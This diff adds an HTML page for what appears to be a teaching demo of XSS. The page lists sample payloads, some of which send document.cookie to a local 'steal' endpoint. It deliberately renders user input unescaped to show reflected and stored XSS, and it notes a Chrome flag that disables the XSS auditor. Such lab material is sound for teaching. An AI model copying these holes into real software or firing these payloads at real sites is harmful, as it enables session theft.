@@ -1,0 +1,95 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>Web 安全演示 - XSS</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/3.3.7/css/bootstrap.min.css" />
+    <script type="text/javascript" src="/webjars/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Web 安全演示 - XSS</h1>
+
+        <h2>Example</h2>
+        <ul>
+            <li>&lt;script&gt;alert('Hello XSS!')&lt;/script&gt;</li>
+            <li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
+            <li>&lt;script&gt;%24.get%28%27http%3A%2F%2Flocalhost%3A9090%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29&lt;/script&gt;</li>
+            <li>http://localhost:8080/xss/search?searchKey=%3Cscript%3E%24.get%28%27http%3A%2F%2Flocalhost%3A9090%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29%3C/script%3E</li>
+            <li>&lt;script&gt;$.get('http://localhost:9090/xss/steal', {cookie: document.cookie})&lt;/script&gt;</li>
+        </ul>
+
+        <h2>非持久型 XSS / 反射性 XSS</h2>
+
+        <h3>服务端无关，纯客户端行为</h3>
+        <p>
+        <input class="search_input" value="" /> <button class="btn-default search_btn">检索</button>
+        </p>
+        <p class="search_box" style="display: none">
+        这里是 <span class="search_key"></span> 的搜索内容
+        <br />
+            bla..bla..bla..bla..bla..bla..
+        </p>
+
+        <hr />
+
+        <h3>服务端相关，但不存储</h3>
+        <p>
+            <input name="searchKey" class="search_input_1" th:value="${searchKey}" /> <button class="btn-default search_btn_1">检索</button>
+        </p>
+        <p class="search_box_1">
+            这里是 <span class="search_key_1" th:utext="${searchKey}"></span> 的搜索内容
+            <br />
+            bla..bla..bla..bla..bla..bla..
+        </p>
+
+        <h2>持久型 XSS</h2>
+        <p>
+            <input name="name" placeholder="请输入您的名字" class="user_input_name" th:value="${name}" /> <button class="btn-default btn-save">保存</button>
+        </p>
+        <p class="search_box_1" th:style="${name} ? '' : 'display: none'">
+            Hello, <span th:utext="${name}"></span>。
+            <br />
+            bla..bla..bla..bla..bla..bla..
+        </p>
+
+        <h2>风险</h2>
+        <ul>
+            <li>💰💰💰💰 - 每年请安全公司做全站的安全检查，一个简单的纯客户端 XSS = 1000</li>
+            <li>安全问题 - 盗取用户信息、伪造用户身份</li>
+        </ul>
+
+        <h2>Tools</h2>
+        <ul>
+            <li>REFERENCE: <a target="_blank" href="https://zoumiaojiang.com/article/common-web-security/">常见 Web 安全攻防总结</a></li>
+            <li>`/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --disable-xss-auditor` - 高版本的 Chrome 会自动识别 XSS 攻击，并禁止你的访问</li>
+        </ul>
+    </div>
+
+    <script type="text/javascript">
+        $('button.search_btn').click(function() {
+            if ($('input.search_input').val()) {
+                $('span.search_key').html($('input.search_input').val());
+                $('p.search_box').show();
+            }
+        });
+
+        $('button.search_btn_1').click(function() {
+            var searchKey = $('input.search_input_1').val();
+            if (searchKey) {
+                location.href = "/xss/search?searchKey=" + searchKey;
+            }
+        });
+
+        $('button.btn-save').click(function() {
+            var username = $('input.user_input_name').val();
+            if (username) {
+                $.post("/xss/save", {name: username}, function(data) {
+                    location.href = "/xss";
+                });
+            }
+        });
+    </script>
+</body>
+</html>
